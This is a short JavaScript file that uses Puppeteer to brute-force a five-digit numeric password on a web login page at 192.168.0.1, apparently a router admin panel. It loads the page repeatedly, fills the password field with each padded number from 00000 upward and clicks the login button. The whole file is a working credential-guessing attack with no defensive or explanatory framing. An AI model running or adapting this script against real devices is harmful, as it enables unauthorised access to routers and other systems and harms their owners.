const puppeteer = require('puppeteer');
const utils = require('../utils');

(async () => {
    
    url=`http://192.168.0.1/login.html`;
    
    const browser = await puppeteer.launch( {'headless' : true} );
    console.log("browser launched...");

    const page = await browser.newPage();
    page.setViewport({ width: 1280, height: 1280 });
    page.setDefaultNavigationTimeout(0);
    console.log("URL Loaded...");
    
    for (let i = 0; i < 99999; i++) 
    {
        var num = utils.padded(i,"00000");
        
        await page.goto(url, {waitUntil: 'networkidle2'});

        await page.waitForSelector("#login-password");

        await page.$eval('#login-password', (el, value) => el.value = value, num);
        await page.$eval('.btn', el => el.click());    
    }

    await browser.close();
    
})();